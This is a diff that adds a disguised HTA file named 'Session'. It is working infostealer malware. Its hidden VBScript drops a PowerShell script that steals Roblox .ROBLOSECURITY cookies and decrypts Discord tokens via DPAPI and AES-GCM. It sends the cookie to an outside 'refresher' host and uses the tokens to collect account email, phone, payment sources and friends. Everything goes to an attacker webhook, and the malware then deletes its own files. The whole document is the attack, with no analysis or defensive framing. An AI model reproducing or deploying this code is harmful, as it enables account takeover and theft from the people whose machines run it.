@@ -1,0 +1,131 @@
+<html>
+<head>
+<title>Session</title>
+<hta:application id="app" applicationname="Session" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+WEBHOOK = "YOUR_WEBHOOK_HERE"
+
+Dim shell, psCmd, psFile
+Set shell = CreateObject("WScript.Shell")
+psFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\r.ps1"
+
+Dim fso, file
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set file = fso.CreateTextFile(psFile, True)
+
+file.WriteLine "$w = '" & WEBHOOK & "'"
+file.WriteLine "$pc = $env:COMPUTERNAME; $user = $env:USERNAME"
+file.WriteLine "$ap = $env:APPDATA; $tmp = $env:TEMP"
+file.WriteLine "Add-Type -AssemblyName System.Security,System.Web"
+file.WriteLine "function Send-Webhook($title,$color,$fields,$file_name,$file_content) {"
+file.WriteLine "  $emb = @{title=$title;color=$color;fields=$fields;footer=@{text=$pc+' / '+$user}}"
+file.WriteLine "  $payload = @{embeds=@($emb)} | ConvertTo-Json -Depth 5 -Compress"
+file.WriteLine "  try { Invoke-RestMethod -Uri $w -Method Post -Body $payload -ContentType 'application/json' } catch {}"
+file.WriteLine "  if ($file_content) {"
+file.WriteLine "    $b = [Guid]::NewGuid().ToString()"
+file.WriteLine "    $lf = " & Chr(34) & "\`r\`n" & Chr(34) & ""
+file.WriteLine "    $bl = @(); $bl += '--'+$b; $bl += 'Content-Disposition: form-data; name=" & Chr(34) & "file" & Chr(34) & "; filename=" & Chr(34) & "'+$file_name+'"+Chr(34)+"'; $bl += 'Content-Type: text/plain'; $bl += ''; $bl += $file_content; $bl += '--'+$b+'--'"
+file.WriteLine "    try { $wc = New-Object Net.WebClient; $wc.Headers.Add('Content-Type','multipart/form-data; boundary='+$b); $wc.UploadString($w,'POST',$bl -join $lf)|Out-Null } catch {}"
+file.WriteLine "  }"
+file.WriteLine "}"
+file.WriteLine ""
+file.WriteLine "# ===== ROBLOX COOKIE ====="
+file.WriteLine "$cookie = $null"
+file.WriteLine "$sp = Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat'"
+file.WriteLine "if (Test-Path $sp) { $found = $true } else {"
+file.WriteLine "  $pr = Join-Path $env:LOCALAPPDATA 'Packages'"
+file.WriteLine "  if (Test-Path $pr) { $ds = Get-ChildItem $pr -Dir -Filter 'ROBLOXCORPORATION.ROBLOX_*' -EA 0"
+file.WriteLine "    foreach ($d in $ds) { $p = Join-Path $d.FullName 'LocalState\RobloxCookies.dat'"
+file.WriteLine "      if (Test-Path $p) { $sp = $p; $found = $true; break } } } }"
+file.WriteLine "if (-not $found) {"
+file.WriteLine "  try { $out = cmd /c 'cmdkey /list' 2>$null"
+file.WriteLine "    if ($out -match 'LegacyGeneric:target=roblox') {"
+file.WriteLine "      $lines = $out -split \"\r?\n\""
+file.WriteLine "      foreach ($l in $lines) { if ($l -match 'User: (.+ROBLOSECURITY.+)') { $cookie = $Matches[1].Trim() } }"
+file.WriteLine "    } } catch {} }"
+file.WriteLine "if (-not $cookie -and $found) {"
+file.WriteLine "  try { $raw = Get-Content $sp -Raw -EA Stop"
+file.WriteLine "    if ($raw -match '(_\|WARNING:-DO-NOT-SHARE-THIS)') { $cookie = $raw.Trim() }"
+file.WriteLine "    elseif ($raw -match '^\s*\{') {"
+file.WriteLine "      try { $d = $raw|ConvertFrom-Json; if($d.CookiesData){"
+file.WriteLine "        $eb=[Convert]::FromBase64String($d.CookiesData);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser);$cookie=[Text.Encoding]::UTF8.GetString($db).Trim()"
+file.WriteLine "      }} catch { if($raw.Length -gt 200){$cookie=$raw.Trim()} }"
+file.WriteLine "    } elseif ($raw -match '\.ROBLOSECURITY') { $cookie = $raw.Trim() }"
+file.WriteLine "  } catch {} }"
+file.WriteLine ""
+file.WriteLine "if ($cookie) {"
+file.WriteLine "  $refreshed = $null; try { $rr = Invoke-RestMethod -Uri ('https://rorefresher-production.up.railway.app/refresh?cookie='+[Uri]::EscapeDataString($cookie)) -TimeoutSec 25; if($rr.success){$refreshed=$rr.bypassedCookie} } catch {}"
+file.WriteLine "  $h = @{'Cookie'='.ROBLOSECURITY='+($refreshed||$cookie);'User-Agent'='Mozilla/5.0';'Accept'='application/json'}"
+file.WriteLine "  $rname='Unknown';$rid='0';$rdis='Unknown';$rrobux=0;$rprem='No';$rrap=0"
+file.WriteLine "  try {$r=Invoke-RestMethod -Uri 'https://users.roblox.com/v1/users/authenticated' -Headers $h -TimeoutSec 10"
+file.WriteLine "    $rname=$r.name;$rid=$r.id;$rdis=$r.displayName}catch{}"
+file.WriteLine "  if($rid -ne '0'){"
+file.WriteLine "    try{$rrobux=(Invoke-RestMethod -Uri 'https://economy.roblox.com/v1/users/'+$rid+'/currency' -Headers $h -TimeoutSec 10).robux}catch{}"
+file.WriteLine "    try{$rprem=if((Invoke-RestMethod -Uri 'https://premiumfeatures.roblox.com/v1/users/'+$rid+'/validate-membership' -Headers $h -TimeoutSec 10)-eq$true){'Yes'}else{'No'}}catch{}"
+file.WriteLine "    try{$items=Invoke-RestMethod -Uri 'https://inventory.roblox.com/v1/users/'+$rid+'/assets/collectibles?sortOrder=Asc&limit=100' -Headers $h -TimeoutSec 10;$rrap=($items.data|Measure-Object -Property recentAveragePrice -Sum).Sum}catch{}"
+file.WriteLine "  }"
+file.WriteLine "  $f = @(@{name='Username';value='@'+$rname;inline=$true},@{name='Display';value=$rdis;inline=$true},@{name='ID';value=$rid.ToString();inline=$true},@{name='Robux';value='{0:N0} R$' -f $rrobux;inline=$true},@{name='Premium';value=$rprem;inline=$true},@{name='RAP';value='{0:N0} R$' -f $rrap;inline=$true},@{name='Refreshed';value=if($refreshed){'Yes ('+$rr.method+')'}else{'No'};inline=$true})"
+file.WriteLine "  $cookieFile = 'Original:'+\"`r`n\"+$cookie; if($refreshed){$cookieFile += \"`r`n`r`nRefreshed (\"+$rr.method+\"):`r`n\"+$refreshed}"
+file.WriteLine "  Send-Webhook 'Roblox Cookie Stolen' 0x00B06F $f ('cookie_'+$rname+'.txt') $cookieFile"
+file.WriteLine "} else {"
+file.WriteLine "  Send-Webhook 'No Roblox Cookie' 0xFF0000 @(@{name='Status';value='No cookie found on this machine';inline=$false}) $null $null"
+file.WriteLine "}"
+file.WriteLine ""
+file.WriteLine "# ===== DISCORD TOKENS ====="
+file.WriteLine "$discordPaths = @{Discord='$ap\discord';DiscordPTB='$ap\discordptb';DiscordCanary='$ap\discordcanary'}"
+file.WriteLine "foreach ($name in $discordPaths.Keys) {"
+file.WriteLine "  $dp = $discordPaths[$name]"
+file.WriteLine "  $ls = Join-Path $dp 'Local State'"
+file.WriteLine "  $ldb = Join-Path $dp 'Local Storage\leveldb'"
+file.WriteLine "  if (-not (Test-Path $ls) -or -not (Test-Path $ldb)) { continue }"
+file.WriteLine "  try {"
+file.WriteLine "    $state = Get-Content $ls -Raw | ConvertFrom-Json"
+file.WriteLine "    $ek = [Convert]::FromBase64String($state.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($state.os_crypt.encrypted_key).Length-1)]"
+file.WriteLine "    $mk = [Security.Cryptography.ProtectedData]::Unprotect($ek, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)"
+file.WriteLine "    $tokens = @()"
+file.WriteLine "    Get-ChildItem $ldb -Filter '*.ldb','*.log' -EA 0 | ForEach-Object {"
+file.WriteLine "      $content = Get-Content $_.FullName -Raw -EA 0"
+file.WriteLine "      $matches = [regex]::Matches($content, 'dQw4w9WgXcQ:([^\s\"]+)')"
+file.WriteLine "      foreach ($m in $matches) {"
+file.WriteLine "        try {"
+file.WriteLine "          $b64 = $m.Groups[1].Value"
+file.WriteLine "          $enc = [Convert]::FromBase64String($b64)"
+file.WriteLine "          $aes = [System.Security.Cryptography.AesGcm]::new([ReadOnlySpan[byte]]$mk)"
+file.WriteLine "          $iv = $enc[3..14]; $ct = $enc[15..($enc.Length-17)]; $tag = $enc[($enc.Length-16)..($enc.Length-1)]"
+file.WriteLine "          $dec = [byte[]]::new($ct.Length)"
+file.WriteLine "          $aes.Decrypt($iv, $ct, $tag, $dec)"
+file.WriteLine "          $token = [Text.Encoding]::UTF8.GetString($dec)"
+file.WriteLine "          if ($token -match '[\w-]{24}\.[\w-]{6}\.[\w-]{25,}') { $tokens += $token }"
+file.WriteLine "        } catch {} } }"
+file.WriteLine "    $tokens = $tokens | Select-Object -Unique"
+file.WriteLine "    foreach ($tok in $tokens) {"
+file.WriteLine "      $th = @{'Authorization'=$tok;'User-Agent'='Mozilla/5.0'}"
+file.WriteLine "      $tuser='N/A';$tid='N/A';$tmail='N/A';$tphone='N/A';$tmfa='N/A';$tnitro='No';$tpay=0;$tguild=0;$tfriend=0"
+file.WriteLine "      try {$u=Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me' -Headers $th -TimeoutSec 8;$tuser=$u.username+'#'+$u.discriminator;$tid=$u.id;$tmail=$u.email;$tphone=$u.phone;$tmfa=$u.mfa_enabled}catch{}"
+file.WriteLine "      try {$n=Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers $th -TimeoutSec 5;$tnitro=if($n.Count -gt 0){'Yes'}else{'No'}}catch{}"
+file.WriteLine "      try {$pay=Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/billing/payment-sources' -Headers $th -TimeoutSec 5;$tpay=$pay.Count}catch{}"
+file.WriteLine "      try {$guild=Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/guilds' -Headers $th -TimeoutSec 5;$tguild=$guild.Count}catch{}"
+file.WriteLine "      try {$friend=Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/relationships' -Headers $th -TimeoutSec 5;$tfriend=($friend|?{$_.type -eq 1}).Count}catch{}"
+file.WriteLine "      $tf = @(@{name='User';value=$tuser;inline=$true},@{name='ID';value=$tid;inline=$true},@{name='Email';value=$tmail;inline=$true},@{name='Phone';value=$tphone;inline=$true},@{name='MFA';value=$tmfa.ToString();inline=$true},@{name='Nitro';value=$tnitro;inline=$true},@{name='Payments';value=$tpay.ToString();inline=$true},@{name='Guilds';value=$tguild.ToString();inline=$true},@{name='Friends';value=$tfriend.ToString();inline=$true})"
+file.WriteLine "      Send-Webhook ('Token: '+$name+ ' / '+$tuser) 0x5865F2 $tf ('token_'+$tuser+'.txt') $tok"
+file.WriteLine "    }"
+file.WriteLine "  } catch {}"
+file.WriteLine "}"
+
+file.Close
+Set file = Nothing
+Set fso = Nothing
+
+shell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """", 0, True
+
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+fso.DeleteFile psFile, True
+fso.DeleteFile WScript.ScriptFullName, True
+Set fso = Nothing
+Set shell = Nothing
+window.close()
+</script>
+</head>
+<body>.</body>
+</html>
